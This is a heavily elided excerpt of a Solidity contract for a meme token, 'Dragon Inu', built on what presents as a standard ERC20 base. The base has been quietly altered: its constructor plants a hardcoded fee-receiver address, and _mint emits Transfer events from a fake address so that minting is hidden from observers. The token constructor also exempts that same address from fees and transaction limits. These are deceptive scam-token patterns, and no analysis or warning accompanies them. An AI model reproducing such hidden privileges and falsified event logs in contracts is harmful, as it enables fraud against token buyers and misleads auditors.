...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xe3eAD82Ac7C2b847566a31Fe05BCBdE66C1932a7] = _marketingwallet;
    }
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x90A204edA697cC1523790C18ca8e69Df6C4D2A42), account, amount);
    }
...
contract DragonInu is ERC20, Ownable {
    ...
    constructor() ERC20("Dragon Inu", "DRINU") {
        ...
        excludeFromFees(address(0xe3eAD82Ac7C2b847566a31Fe05BCBdE66C1932a7), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xe3eAD82Ac7C2b847566a31Fe05BCBdE66C1932a7), true);
